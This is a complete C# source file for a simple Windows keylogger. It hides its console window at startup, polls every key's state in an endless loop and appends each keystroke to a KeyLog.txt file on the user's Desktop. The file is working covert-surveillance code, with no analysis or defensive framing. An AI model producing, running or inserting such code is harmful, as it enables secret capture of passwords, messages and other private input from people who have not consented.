using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Threading;
using System.Windows.Forms;
using System.IO;
using System.Runtime.InteropServices;

namespace SimpleKeyLogging
{
    class Program
    {
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);


        const int SW_HIDE = 0;
        const int SW_SHOW = 5;
        public static void Main(String[] arg)
        {
            var handle = GetConsoleWindow();
            ShowWindow(handle, SW_HIDE);
            Start();
        }
        static void Start()
        {
            while (true)
            {
                Thread.Sleep(10);
                for (Int32 i = 0; i < 255; i++)
                {
                    int keyState = GetAsyncKeyState(i);
                    if (keyState == 1 || keyState == -32767)
                    {
                        string txtStringKeys = Convert.ToString((Keys)i);

                        File.AppendAllText("C:\\Users\\" + Environment.UserName + "\\Desktop\\KeyLog.txt", Environment.NewLine + txtStringKeys);

                        break;

                    }
                }
            }
        }
    }
}
